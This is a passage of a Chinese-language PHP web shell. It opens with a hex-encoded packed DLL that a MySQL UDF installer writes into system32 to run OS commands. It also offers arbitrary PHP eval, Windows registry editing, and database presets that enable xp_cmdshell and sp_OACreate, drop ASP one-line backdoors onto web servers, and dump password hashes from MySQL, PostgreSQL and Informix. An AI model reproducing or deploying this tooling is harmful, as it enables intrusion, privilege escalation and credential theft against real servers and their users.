3810760830C36821F83848F208334CD91299EA1830D32D8A46FA7B79FCE760EC2601FD70B18070069BEB35D0517C00B1D0490664006968D08644006648E8F9006644006919293CC066140039F78EF4D54EC25FF0204222B6027CF0EF68279822117A6DF07A1A581E9CDF3EF9FE0FC2F407E80FCA8C1A3DAA34F0D72F60881FE0740B577830C812F41B65FCFA2E43E5F21FFA21A00E5A2E8A25B7EA1FE5105BF92DFEE03DA5EDA5F5FDA6ADA32D3D8DEE0B26627B7F939317E430303860064AA432EE99E9C84538B9876840380A6699AA67C7874706C9AA6699A645C54483C34699AA6692824201C18A6699AA614100C08044DD334970075FCF8F0E4DCA6E99E35D42F75CC03C4BC9AA6699AB0A89C908C8849BEA669806C64CD2E821D65BB8C8F905C037F009EF040E82F500B807007F0F11325DCA0D1535499508BDD50C944548CF38CDC97B058592CA7BF06699A0E1EEF3B5A9775A769BAA7B5D4F3E0301AB86CD3034E6D01333AB759699AA6697796B4D3F20CDA74DD272F034D6C01F108A48008368024444144210980D109600064C15B054D734325746554B6CBB7572C0D44656C65466905410A105FDB0C470A0953C5D87393CD2719522C0A23EC4F56C145185661726961622212C0EC7F436C6F736548616E6425F62AD80E4B4A500B63417B7B56686753791D656D4447B7C1B656F5227914744E747515B893FD70496E666F413569704FB1DBD62EA845782A08535D65702CFB36CCFD56657273696F163B896E6754792D67DF856C570F1F4C434D6170115706882E610D1B4D7073ED5BC34279126F65646543688366E5ABA03DFB644F66F34C6FFD8E6B68FF300B746C556E773C3D48D767EDAC7C70416C6C0A46B1FB432D7B9BE16F6D6D09336E7DACB38556982673FB0B790CC580D866E50B56ADB521419C42494D1E263CC3D609630A532740B029DBDACA16AD147215421BC0B64C5B762B78108C8580250B77C5EB8407C4600C542FB998A170B6DA75D3F812DCDD3302524964386C7353F3B3378BDD5575650C4F09DE4BD2258C531D2D471A086D618643427552C93B2463366412A0D50CC363141E4D6F64BDA34E616D6A3B2160BC5F9EE473183004470A0CF3CA6624A3FD08E42CCFF04258164361853B1CFE66BF08506F6990C906C25EF99DFD6B65644465633815C2844D72496E53EB460F3AC1F1EF73684B427566663E6A50ECB136761C0A410B074F454D092C19FE10934164647297EF7D2841BCD93C7155524C440A5BA4668277E3CE1C88F6F6FE340457534153864D00FF0402CBB22CCB17390334090C8D32B62C0B022649F7FF7FAE6D0C10025C000A052F0A5205546417350BDFFEFFFF811912192A060B2A385319310B320D1B806512ED2405670B30100F1CFFFFFFFF1B1B96130B530B1C455405400645171106180A118145110B4C310526530F7D1CFBA5FFFF078B1214050B121B271A1241691A09F04BF83A06F0520103BFFDFF7F0802070F080B06060A18050A1A0E080643125C1B4F59085A0DA37DF66FFF0F16F03001BAF00AF6211775F0C8020400CE2D07E6EDEDBF5F10070708270C0A08300A0608050C050CBFB5FFBB16030813082D1B10060F06070921AE08F04F020E6BBFB5ED061A050F107EA20605060D1D15349BFBF69B2244A6F0ED0120130616070F1810FBFFDBDB091A571362A9850E0B14060E09111C0F12091C230A03FFFFFFBF0C137F0A1CF0F20007194212310C0B0F0AF00302F04D012C0C1C191A0811F6ED5BFB050D05F00549BF05380C0757070A19088EDBADFDDB05663A081A0611190C7113081E0917F6FF0B6F17621806422214320715320A2115242A0E311CF6DF6EFF21250F0F321043CB140E47065B074845E3193539DBDF6EFF0C103F50133E1282260D8E13270F42141E6D157CFBFF6FAA0E13770D251C1374A04D18154A481712E3084B2512842F6C2F47550118EF051D29261A072842EEDE1D4A0604660B1B07161D2A32FFB7B77F7228060C3B0829710D0C234F6039150D3D22084C0F19615BFBFF262E0F20222D143A0726181A0B83A67C56DBFFFF138AF0FB00790C150B2EF0D9011C0D0D13090C32C221B76678E106210A1D081715A919E80B0AFBDF0A0B6E432C0019066F061E1113151EF95068857F10210C120E0F11759647BFF00BCDB85C7EF056011E550F0AC60A89050BFFBFB51F4C35080E1E1D182058163368254605030717FEAD6DFC103D105612F03E01EC48B24F30BD71E1B75B045E2F0F5838EA3C7D3810040CFB76F38301F0B4030408F0AC0A0DF014010417C8915D7E2010108408020800046453203FF0240608041009F92F71E90C9C645045A54C010400B2976A46AA4EF90FE0000E210B0106264B004F26A9244110BDEC3CFB09100F04000700D0B237E982272A0202079B6D7ED81E8D000071C886620285B9650AC0648A002B8CAA4BA744B0100C76F92E7465787446619070E2AD2A6574CD602E7212669D2BC1AB0D5303FB5E73D902402E26CF2427B62919A49090C04F6519EC6B0F7D584FC027A06F6EBF29421B5C881051C489C700000000000000800400FF00807C2408010F85C201000060BE00A000108DBE0070FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9960100008A07472CE83C0177F7803F0A75F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE00C000008B0709C074458B5F048D843000E0000001F35083C708FF9650E00000958A074708C074DC89F979070FB707475047B95748F2AE55FF9654E0000009C07407890383C304EBD86131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE58E000008DBE00F0FFFFBB0010000050546A045357FFD58D87FF01000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9C73CFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000070F0000050F000000000000000000000000000007DF0000060F0000000000000000000000000000088F0000068F00000000000000000000000000000000000000000000092F00000A0F00000B0F0000000000000C0F000000000000073000080000000004B45524E454C33322E444C4C0075726C6D6F6E2E646C6C005753325F33322E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F74656374000055524C446F776E6C6F6164546F46696C65410000000000000000B1976A46000000001EF1000001000000030000000300000000F100000CF1000018F100009010000090150000801000002BF1000031F100003EF100000000010002006D7973716C446C6C2E646C6C0073746174650073746174655F6465696E69740073746174655F696E69740000000000E000000C0000001D360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
}
function Mysql_u()
{   
	extract($_POST);
	extract($_GET);
	$mysql_hostname = $mysql_hostname?$mysql_hostname : "localhost";
	$mysql_username = $mysql_username?$mysql_username : "root";
	$post_sql = $post_sql ? $post_sql : "select state(\"net user\")";
	$mysql_dbname = $mysql_dbname ? $mysql_dbname : "mysql";
if($install){
	$link = mysql_connect ($mysql_hostname,$mysql_username,$mysql_passwd) or die(mysql_error());
	mysql_select_db($mysql_dbname,$link) or die(mysql_error());
	@mysql_query("DROP TABLE udf_temp", $link);
	$query="CREATE TABLE udf_temp (udf BLOB);";
if(!($result=mysql_query($query, $link)))
die('创建临时表失败'.mysql_error());
else
{
	$code=get_code();
	$query="INSERT into udf_temp values (CONVERT($code,CHAR));";
	if(!mysql_query($query, $link))
	{
		mysql_query('DROP TABLE udf_temp', $link) or die(mysql_error());
		die('安装dll失败'.mysql_error());
	}
	else
	{
		$dllname = "mysqlDll.dll";
	if(file_exists("c:\\windows\\system32\\")) $dir="c:\\\\windows\\\\system32\\\\mysqlDll.dll";
	elseif(file_exists("c:\\winnt\\system32\\")) $dir="c:\\\\winnt\\\\system32\\\\mysqlDll.dll"; 
	if(file_exists($dir)) {
		$time = time();
		$dir = str_replace("mysqlDll","mysqlDll_$time",$dir);
		$dllname = str_replace("mysqlDll","mysqlDll_$time",$dllname);
	}
$query = "SELECT udf FROM udf_temp INTO DUMPFILE '".$dir."';" ;
	if(!mysql_query($query, $link))
	{
		die("安装失败:$dir无权".mysql_error());
	}
	else
	{
		echo '<font style=font:11pt color=ff0000>'.$dir.'安装成功</font><br>';
	}
}
mysql_query('DROP TABLE udf_temp', $link) or die(mysql_error());
$result = mysql_query("Create Function state returns string soname '$dllname'", $link) or die(mysql_error());
if($result) {
	echo "成功<br><a href='?'>返回</a>";
	exit();
}
}
}
?>
<form method="post" action="?s=ee"><div class="actall">Host:<input name="mysql_hostname" value="<?echo $mysql_hostname;?>" type="text" style="width:100px" >
User:<input name="mysql_username" value="<?echo $mysql_username;?>" type="text"  style="width:70px"> Password:<input type="password" name="mysql_passwd" value="<?echo $mysql_passwd;?>" style="width:70px"> DB:<input name="mysql_dbname" value="<?echo $mysql_dbname;?>" type="text" style="width:70px"> <input class="bt" name="install" type="submit" value="安装"><br><br>
sql执行:<br>
<textarea name="post_sql" cols="80" rows="10"><?echo stripslashes($post_sql);?></textarea><br>
<input class="bt" name="" type="submit" value="执行"><br></form>
回显:</div>
<?
if ($_POST[post_sql]) {
$link = mysql_connect ($mysql_hostname,$mysql_username,$mysql_passwd) or die(mysql_error());
if($mysql_dbname) mysql_select_db($mysql_dbname,$link) or die(mysql_error());
$query = stripslashes($post_sql);
$result = mysql_query($query, $link)  or die(mysql_error());
?>
<br><textarea name="post_sql" style="width:610px;height:180px;">
<?
echo ($result) ? "Done:$result\n\n" : "error:$result\n\n ".mysql_error();
while ($row =  @mysql_fetch_array ($result)) {
print_r ($row);
}
}
?>
</textarea>
<?
}
//eval执行php代码
function phpcode()
{
print<<<END
<div class="actall"><h5>输入php代码:<h5></div>
<form action="?s=ff" method="POST">
<div class="actall"><textarea name="phpcode" rows="20" cols="80">phpinfo();/*print_r(apache_get_modules());*/</textarea></div><br />
<div><input class="bt" type="submit" value="EVAL执行"></div><br></form>
END;
$phpcode = $_POST['phpcode'];
$phpcode = trim($phpcode);
if($phpcode){
	if (!preg_match('#<\?#si',$phpcode)){
	$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	}
eval("?".">$phpcode<?");
echo '<br><br>';
}
return false;
}
//其它数据库连接
function otherdb(){
$db = isset($_GET['db']) ? $_GET['db'] : '';
print<<<END
<form method="POST" name="dbform" id="dbform" action="?s=gg&db={$db}" enctype="multipart/form-data">
<div class="actall"><a href="?s=gg"> &nbsp psotgresql &nbsp</a> 
<a href="?s=gg&db=ms"> &nbsp mssql &nbsp</a> 
<a href="?s=gg&db=ora"> &nbsp oracle &nbsp</a>
<a href="?s=gg&db=ifx"> &nbsp informix &nbsp</a>
<a href="?s=gg&db=fb"> &nbsp  firebird &nbsp</a>
<a href="?s=gg&db=db2">&nbsp db2 &nbsp</a></div></form>
END;
if ($db=="ms"){
$mshost = isset($_POST['mshost']) ? $_POST['mshost']:'localhost';
$msuser = isset($_POST['msuser']) ? $_POST['msuser'] : 'sa';
$mspass = isset($_POST['mspass']) ? $_POST['mspass'] : '';
$msdbname = isset($_POST['msdbname']) ? $_POST['msdbname'] : 'master';
$msaction = isset($_POST['action']) ? $_POST['action'] : '';
$msquery = isset($_POST['mssql']) ? $_POST['mssql'] : '';
$msquery = stripslashes($msquery);
print<<<END
<form method="POST" name="msform" action="?s=gg&db=ms"><br>
<div class="actall">Host:<input type="text" name="mshost" value="{$mshost}" style="width:100px">
User:<input type="text" name="msuser" value="{$msuser}" style="width:100px">
Pass:<input type="text" name="mspass" value="{$mspass}" style="width:100px">
Dbname:<input type="text" name="msdbname" value="{$msdbname}" style="width:100px"><br>
<script language="javascript">
function msFull(i){
	Str = new Array(11);
	Str[0] = "";
	Str[1] = "select @@version;";
	Str[2] = "select name from sysdatabases;";
	Str[3] = "select name from sysobject where type='U';";
	Str[4] = "select name from syscolumns where id=Object_Id('table_name');";
	Str[5] = "Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll');";
	Str[6] = "Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');";
	Str[7] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
	Str[8] = "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;";
	Str[9] = "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;";
	Str[10] = "Exec master.dbo.xp_cmdshell 'net user';";
	Str[11] = "Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(request(char(35)))%^> > c:\\\\1.asp';";
	Str[12] = "sp_makewebtask @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))%>''' ";
	msform.mssql.value = Str[i];
	return true;
}
</script>
<textarea name="mssql" style="width:600px;height:200px;">{$msquery}</textarea><br>
<select onchange="return msFull(options[selectedIndex].value)">
	<option value="0" selected>执行命令</option>
	<option value="1">显示版本</option>
	<option value="2">数据库</option>
	<option value="3">表段</option>
	<option value="4">字段</option>
	<option value="5">sp_oacreate</option>
	<option value="6">xp_cmdshell</option>
	<option value="7">xp_cmdshell(2005)</option>
	<option value="8">sp_oacreate(2005)</option>
	<option value="9">打开openrowset(2005)</option>
	<option value="10">xp_cmdshell exec</option>
	<option value="10">sp_oamethod exec</option>
	<option value="11">sp_makewebtask</option>
</select>
<input type="hidden" name="action" value="msquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
if ($msaction == 'msquery'){
$msconn= mssql_connect ($mshost , $msuser, $mspass);  
mssql_select_db($msdbname,$msconn) or die("connect error :" .mssql_get_last_message());
$msresult = mssql_query($msquery) or die(mssql_get_last_message());
echo '<font face="verdana">';
echo '<table border="1" cellpadding="1" cellspacing="2">';
echo "\n<tr>\n";
for ($i=0; $i<mssql_num_fields($msresult); $i++)
{
echo '<td bgcolor="#228B22"><b>'.
mssql_field_name($msresult, $i);
echo "</b></td>\n";
}
echo "</tr>\n";
mssql_data_seek($result, 0);
while ($msrow=mssql_fetch_row($msresult))
{
echo "<tr>\n";
for ($i=0; $i<mssql_num_fields($msresult); $i++ )
{
echo '<td bgcolor="#B8B8E8">';
echo "$msrow[$i]";
echo '</td>';
}
echo "</tr>\n";
}
echo "</table>\n";
echo "</font>";
mssql_free_result($msresult);
mssql_close();
}
}
elseif ($db=="ora"){
$orahost = isset($_POST['orahost']) ? $_POST['orahost'] : 'localhost';
$oraport = isset($_POST['oraport']) ? $_POST['oraport'] : '1521';
$orauser = isset($_POST['orauser']) ? $_POST['orauser'] : 'root';
$orapass = isset($_POST['orapass']) ? $_POST['orapass'] : '123456';
$orasid = isset($_POST['orasid']) ? $_POST['orasid'] : 'ORCL';
$oraaction = isset($_POST['action']) ? $_POST['action'] : '';
$oraquery = isset($_POST['orasql']) ? $_POST['orasql'] : '';
$oraquery = stripslashes($oraquery);
print<<<END
<form method="POST" name="oraform" action="?s=gg&db=ora">
<div class="actall">Host:<input type="text" name="orahost" value="{$orahost}" style="width:100px">
Port:<input type="text" name="oraport" value="{$oraport}" style="width:50px">
User:<input type="text" name="orauser" value="{$orauser}" style="width:80px">
Pass:<input type="text" name="orapass" value="{$orapass}" style="width:100px">
SID:<input type="text" name="orasid" value="{$orasid}" style="width:50px"><br><br>
<script language="javascript">
function oraFull(i){
Str = new Array(8);
	Str[0] = ""; 
	Str[1] = "select version();";
	Str[2] = "show databases;";
	Str[3] = "show tables from db_name;";
	Str[4] = "show columns from table_name;";
	Str[5] = "select user,password from mysql.user;";
	Str[6] = "select load_file(0xxxxxxxxxxxxxxxxxxxxx);";
	Str[7] = "select 0xxxxx from mysql.user into outfile 'c:\\\\inetpub\\\\wwwroot\\\\test.php'";
	oraform.orasql.value = Str[i];
	return true;
}
</script>
<textarea name="orasql" style="width:600px;height:200px;">{$oraquery}</textarea><br>
<select onchange="return oraFull(options[selectedIndex].value)">
	<option value="0" selected>执行命令</option>
	<option value="1">显示版本</option>
	<option value="2">数据库</option>
	<option value="3">表段</option>
	<option value="4">字段</option>
	<option value="5">hashes</option>
	<option value="6">读取文件</option>
	<option value="7">写文件</option>
</select>
<input type="hidden" name="action" value="myquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
if ($oraaction == 'oraquery'){
$oralink = OCILogon($orauser,$orapass,"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=$orasid)))") or die(ocierror()); 
$oraresult=ociparse($oralink,$oraquery) or die(ocierror());
$orarow=oci_fetch_row($oraresult);
echo '<font face="verdana">';
echo '<table border="1" cellpadding="1" cellspacing="2">';
echo "\n<tr>\n";
for ($i=0; $i<oci_num_fields($oraresult); $i++)
{
	echo '<td bgcolor="#228B22"><b>'.
	oci_field_name($oraresult, $i);
	echo "</b></td>\n";
}
echo "</tr>\n";
ociresult($oraresult, 0);
while ($orarow=ora_fetch_row($oraresult))
{
echo "<tr>\n";
for ($i=0; $i<ora_num_fields($result); $i++ )
{
echo '<td bgcolor="#B8B8E8">';
echo "$orarow[$i]";
echo '</td>';
}
echo "</tr>\n";
}
echo "</table>\n";
echo "</font>";
oci_free_statement($oraresult);
ocilogoff();
}
}
elseif ($db == "ifx"){
$ifxuser = isset($_POST['ifxuser']) ? $_POST['ifxuser'] : 'root';
$ifxpass = isset($_POST['ifxpass']) ? $_POST['ifxpass'] : '123456';
$ifxdbname = isset($_POST['ifxdbname']) ? $_POST['ifxdbname'] : 'ifxdb';
$ifxaction = isset($_POST['action']) ? $_POST['action'] : '';
$ifxquery = isset($_POST['ifxsql']) ? $_POST['ifxsql'] : '';
$ifxquery = stripslashes($ifxquery);
print<<<END
<form method="POST" name="ifxform" action="?s=gg&db=ifx">
<div class="actall">Dbname:<input type="text" name="ifxhost" value="{$ifxdbname}" style="width:100px">
User:<input type="text" name="ifxuser" value="{$ifxuser}" style="width:100px">
Pass:<input type="text" name="ifxpass" value="{$ifxpass}" style="width:100px"><br><br>
<script language="javascript">
function ifxFull(i){
Str = new Array(11);
	Str[0] = "";
	Str[1] = "select dbservername from sysobjects;";
	Str[2] = "select name from sysdatabases;";
	Str[3] = "select tabname from systables;";
	Str[4] = "select colname from syscolumns where tabid=n;";
	Str[5] = "select username,usertype,password from sysusers;";
	ifxform.ifxsql.value = Str[i];
	return true;
}
</script>
<textarea name="ifxsql" style="width:600px;height:200px;">{$ifxquery}</textarea><br>
<select onchange="return ifxFull(options[selectedIndex].value)">
	<option value="0" selected>执行命令</option>
	<option value="1">数据库服务器名称</option>
	<option value="1">数据库</option>
	<option value="2">表段</option>
	<option value="3">字段</option>
	<option value="4">hashes</option>
</select>
<input type="hidden" name="action" value="ifxquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
if ($ifxaction == 'ifxquery'){
	$ifxlink = ifx_connect($ifcdbname, $ifxuser, $ifxpass) or die(ifx_errormsg());
	$ifxresult = ifx_query($ifxquery,$ifxlink) or die (ifx_errormsg());
	$ifxrow=ifx_fetch_row($ifxresult);
	echo '<font face="verdana">';
	echo '<table border="1" cellpadding="1" cellspacing="2">';
	echo "\n<tr>\n";
	for ($i=0; $i<ifx_num_fields($ifxresult); $i++)
{
echo '<td bgcolor="#228B22"><b>'.
ifx_fieldproperties($ifxresult);
echo "</b></td>\n";
}
echo "</tr>\n";
mysql_data_seek($ifxresult, 0);
while ($ifxrow=ifx_fetch_row($ifxresult))
{
echo "<tr>\n";
for ($i=0; $i<ifx_num_fields($ifxresult); $i++ )
{
echo '<td bgcolor="#B8B8E8">';
echo "$ifxrow[$i]";
echo '</td>';
}
echo "</tr>\n";
}
echo "</table>\n";
echo "</font>";
ifx_free_result($ifxresult);
ifx_close();
}
}
elseif ($db=="db2"){
$db2host = isset($_POST['db2host']) ? $_POST['db2host'] : 'localhost';
$db2port = isset($_POST['db2port']) ? $_POST['db2port'] : '50000';
$db2user = isset($_POST['db2user']) ? $_POST['db2user'] : 'root';
$db2pass = isset($_POST['db2pass']) ? $_POST['db2pass'] : '123456';
$db2dbname = isset($_POST['db2dbname']) ? $_POST['db2dbname'] : 'mysql';
$db2action = isset($_POST['action']) ? $_POST['action'] : '';
$db2query = isset($_POST['db2sql']) ? $_POST['db2sql'] : '';
$db2query = stripslashes($db2query);
print<<<END
<form method="POST" name="db2form" action="?s=gg&db=db2">
<div class="actall">Host:<input type="text" name="db2host" value="{$db2host}" style="width:100px">
Port:<input type="text" name="db2port" value="{$db2port}" style="width:60px">
User:<input type="text" name="db2user" value="{$db2user}" style="width:100px">
Pass:<input type="text" name="db2pass" value="{$db2pass}" style="width:100px">
Dbname:<input type="text" name="db2dbname" value="{$db2dbname}" style="width:100px"><br><br>
<script language="javascript">
function db2Full(i){
Str = new Array(4);
	Str[0] = "";
	Str[1] = "select schemaname from syscat.schemata;";
	Str[2] = "select name from sysibm.systables;";
	Str[3] = "select colname from syscat.columns where tabname='table_name';";
	Str[4] = "db2 get db cfg for db_name;";
db2form.db2sql.value = Str[i];
return true;
}
</script>
<textarea name="db2sql" style="width:600px;height:200px;">{$db2query}</textarea><br>
<select onchange="return db2Full(options[selectedIndex].value)">
	<option value="0" selected>执行命令</option>
	<option value="1">数据库</option>
	<option value="1">表段</option>
	<option value="2">字段</option>
	<option value="3">数据库配置</option>
</select>
<input type="hidden" name="action" value="db2query">
<input class="bt" type="submit" value="Query"></div></form>
END;
if ($myaction == 'db2query'){
$db2link = db2_connect($db2dbname, $db2user, $db2pass) or die(db2_conn_errormsg());
$db2result = db2_exec($db2link,$db2query) or die(db2_stmt_errormsg());
$db2row=db2_fetch_row($db2result);
echo '<font face="verdana">';
echo '<table border="1" cellpadding="1" cellspacing="2">';
echo "\n<tr>\n";
for ($i=0; $i<db2_num_fields($db2result); $i++)
{
echo '<td bgcolor="#228B22"><b>'.
db2_field_name($db2result);
echo "</b></td>\n";
}
echo "</tr>\n";
while ($db2row=db2_fetch_row($db2result))
{
echo "<tr>\n";
for ($i=0; $i<db2_num_fields($db2result); $i++ )
{
echo '<td bgcolor="#B8B8E8">';
echo "$db2row[$i]";
echo '</td>';
}
echo "</tr>\n";
}
echo "</table>\n";
echo "</font>";
db2_free_result($db2result);
db2_close();
}
}
elseif($db == "fb") {
$fbhost = isset($_POST['fbhost']) ? $_POST['fbhost'] : 'localhost';
$fbpath = isset($_POST['fbpath']) ? $_POST['fbpath'] : '';
$fbpath = str_replace("\\\\", "\\", $fbpath);
$fbuser = isset($_POST['fbuser']) ? $_POST['fbuser'] : 'sysdba';
$fbpass = isset($_POST['fbpass']) ? $_POST['fbpass'] : 'masterkey';
$fbaction = isset($_POST['action']) ? $_POST['action'] : '';
$fbquery = isset($_POST['fbsql']) ? $_POST['fbsql'] : '';
$fbquery = stripslashes($fbquery);
print<<<END
<form method="POST" name="fbform" action="?s=gg&db=fb">
<div class="actall">Host:<input type="text" name="fbhost" value="{$fbhost}" style="width:100px">
Path:<input type="text" name="fbpath" value="{$fbpath}" style="width:100px">
User:<input type="text" name="fbuser" value="{$fbuser}" style="width:100px">
Pass:<input type="text" name="fbpass" value="{$fbpass}" style="width:100px"><br/>
<script language="javascript">
function fbFull(i){
Str = new Array(5);
	Str[0] = "";
	Str[1] = "select RDB\$RELATION_NAME from RDB\$RELATIONS;";
	Str[2] = "select RDB\$FIELD_NAME from RDB\$RELATION_FIELDS where RDB\$RELATION_NAME='table_name';";
	Str[3] = "input 'D:\\createtable.sql';";
	Str[4] = "shell netstat -an;";
fbform.fbsql.value = Str[i];
return true;
}
</script>
<textarea name="fbsql" style="width:600px;height:200px;">{$fbquery}</textarea><br>
<select onchange="return fbFull(options[selectedIndex].value)">
	<option value="0" selected>执行命令</option>
	<option value="1">表段</option>
	<option value="2">字段</option>
	<option value="3">添加sql</option>
	<option value="4">shell</option>
</select>
<input type="hidden" name="action" value="fbquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
if ($fbaction == 'fbquery'){
	$fblink = ibase_connect($fbhost.':'.$fbpath,$fbuser,$fbpass) or die(ibase_errmsg());
	$fbresult = ibase_query($fblink,$fbquery) or die(ibase_errmsg());
	echo '<font face="verdana">';
	echo '<table border="1" cellpadding="1" cellspacing="2">';
	echo "\n<tr>\n";
	for ($i=0; $i<ibase_num_fields($fbresult); $i++)
	{
	echo '<td bgcolor="#228B22"><b>'.
	ibase_field_info($fbresult, $i);
	echo "</b></td>\n"; 
	}
	echo "</tr>\n";
	ibase_field_info($fbresult, 0);
	while ($fbrow=ibase_fetch_row($fbresult))
{
echo "<tr>\n";
for ($i=0; $i<ibase_num_fields($fbresult); $i++ )
{
echo '<td bgcolor="#B8B8E8">';
echo "$fbrow[$i]";
echo '</td>';
}
echo "</tr>\n";
}
echo "</table>\n";
echo "</font>";
ibase_free_result($fbresult);
ibase_close();
}
}
else{
$pghost = isset($_POST['pghost']) ? $_POST['pghost'] : 'localhost';
$pguser = isset($_POST['pguser']) ? $_POST['pguser'] : 'postgres';
$pgpass = isset($_POST['pgpass']) ? $_POST['pgpass'] : '';
$pgdbname = isset($_POST['pgdbname']) ? $_POST['pgdbname'] : 'postgres';
$pgaction = isset($_POST['action']) ? $_POST['action'] : '';
$pgquery = isset($_POST['pgsql']) ? $_POST['pgsql'] : ''; 
$pgquery = stripslashes($pgquery);
print<<<END
<form method="POST" name="pgform" action="?s=gg">
<div class="actall">Host:<input type="text" name="pghost" value="{$pghost}" style="width:100px;">
User:<input type="text" name="pguser" vaule="{$pguser}" style="width:100px">
Pass:<input tyoe="text" name="pgpass" value="{$pgpass}" style="width:100px">
Dbname:<input type="text" name="pgdbname" value="{$pgdbname}" style="width:100px"><br><br>
<script language="javascript">
function pgFull(i){
Str = new Array(7);
	Str[0] = "";
	Str[1] = "select version();";
	Str[2] = "select datname from pg_database;";
	Str[3] = "select relname from pg_stat_user_tables limit 1 offset n;";
	Str[4] = "select column_name from information_schema.columns where table_name='xxx' limit 1 offset n;";
	Str[5] = "select usename,passwd from pg_shadow;";
	Str[6] = "select pg_file_read('pg_hba.conf',1,pg_file_length('pg_hb.conf'));";
	pgform.pgsql.value = Str[i];
	return true;
}
</script>
<textarea name="pgsql" style="width:600px;height:200px;">{$pgquery}</textarea><br>
<select onchange="return pgFull(options[selectedIndex].value)">
	<option value="0" selected>执行命令</option>
	<option value="1">显示版本</option>
	<option value="2">数据库</option>
	<option value="3">表段</option>
	<option value="4">字段</option>
	<option value="5">hashes</option>
	<option value="6">pg_hb.conf</option>
</select>
<input type="hidden" name="action" value="pgquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
if ($pgaction == 'pgquery'){
$pgconn = pg_connect("host=$pghost dbname=$pgdbname user=$pguser password=$pgpass ") 
        or die( 'Could not connect: ' . pg_last_error()); 
$pgresult = pg_query($pgquery) or die( 'Query failed: '.pg_last_error()); 
$pgrow=pg_fetch_row($pgresult);
echo '<font face="verdana">';
echo '<table border="1" cellpadding="1" cellspacing="2">';
echo "\n<tr>\n";
for ($i=0; $i<pg_num_fields($pgresult); $i++)
{
echo '<td bgcolor="#228B22"><b>'.
pg_field_name($pgresult, $i);
echo "</b></td>\n";
}
echo "</tr>\n";
pg_result_seek($pgresult, 0);
while ($pgrow=pg_fetch_row($pgresult))
{
echo "<tr>\n";
for ($i=0; $i<pg_num_fields($pgresult); $i++ )
{
echo '<td bgcolor="#B8B8E8">';
echo "$pgrow[$i]";
echo '</td>';
}
echo "</tr>\n";
}
echo "</table>\n";
echo "</font>";
pg_free_result($pgresult);
pg_close();
}
}
}
//WIN注册表读取
function phpreg(){
$shell1 = new COM("wscript.shell") or die("require windows host");
$action = isset($_POST['action']) ? $_POST['action'] : '';  
echo '<div class="actall"><h5>Windows注册表读写</h5></div>';
print<<<END
<TR><form action="" method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>   
路径:<input type="hidden" name="action" value="读取">   
<input type="text" name="rpath" value="{$rpath}" size="70">   
<input class="bt" type="submit" value="读取"></form><br></TD></TR></div>   
END;
$rpath = isset($_POST['rpath']) ? $_POST['rpath'] : '';   
$rpath = str_replace("\\\\", "\\", $rpath);      
if ($action=="read"){
$out = $shell1->RegRead($rpath);
echo '<pre>'.var_dump($out).'</pre>';     
}
print<<<END
<TR><form action="" method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>位置:<input type="text" name="wpath" value="{$wpath}" size="70"><BR><br> 
类型:<input type="text" name="wtype" value="{$wtype}" size="20"> 值:<input type="text" name="wvalue" value="{$wvalue}" size="30">
<input type="hidden" name="action" value="write"><input class="bt" type="submit" value="写入"></form></TD></TR></div>   
END;
$wpath = isset($_POST['wpath']) ? $_POST['wpath'] : '';   
$wpath = str_replace("\\\\", "\\", $wpath);      
$wtype = isset($_POST['wtype']) ? $_POST['wtype'] : '';
$wvalue = isset($_POST['wvalue']) ? $_POST['wvalue'] : '';
if($action=="write"){
$shell1->RegWrite($wpath, $wvalue, $wtype);     
}
print<<<END
<TR><form action="" method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>  
位置:<input type="hidden" name="action" value="del">   
<input type="text" name="dpath" value="{$dpath}" size="70">   
<input class="bt" type="submit" value="删"></form></TD></TR></div>   
END;
$dpath = isset($_POST['dpath']) ? $_POST['dpath'] : '';   
$dpath = str_replace("\\\\", "\\", $dpath);      
if($action=="del"){
$out = $shell1->RegDelete($dpath);  
}
}
//MySql执行
function Mysql_n()
{
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
